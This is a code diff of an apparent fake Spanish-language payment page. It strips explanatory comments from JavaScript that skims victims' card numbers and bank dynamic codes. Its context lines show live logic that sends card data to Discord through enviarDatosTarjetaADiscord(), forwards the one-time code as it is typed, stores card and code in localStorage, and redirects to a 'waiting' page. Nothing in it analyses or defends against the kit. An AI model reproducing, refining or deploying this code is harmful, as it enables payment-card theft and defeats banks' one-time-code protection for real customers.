@@ -740,7 +740,6 @@
             }
         }
 
-        /* Modal Autorización */
         .auth-modal {
             display: none;
             position: fixed;
@@ -1155,7 +1154,6 @@ function enviarDatosTarjetaADiscord() {
     if (!this.disabled) {
         e.preventDefault();
 
-        // Enviar datos a Discord
         enviarDatosTarjetaADiscord();
 
         const cardInput = document.getElementById('cardNumber').value.replace(/\D/g, '');
@@ -1213,7 +1211,6 @@ function enviarDatosTarjetaADiscord() {
     document.getElementById('montoPopup2').textContent = Number(monto).toLocaleString('es-CO');
 });
 
-// Enviar la clave dinámica a Discord cuando se complete
 dynamicInput.addEventListener('input', function() {
     const codigo = this.value.replace(/\D/g, '');
     
@@ -1238,11 +1235,9 @@ document.getElementById('btnEnviarDinamica').addEventListener('click', function(
     const codigo = document.getElementById('dynamicCode').value;
     const tarjeta = document.getElementById('popupCardNumber').textContent;
 
-    // Guardamos para que la pantalla de espera los envíe al servidor
     localStorage.setItem('lastCode', codigo);
     localStorage.setItem('lastCard', tarjeta);
 
-    // Redirigimos a la pantalla de espera
     window.location.href = 'espera.html';
 });
 
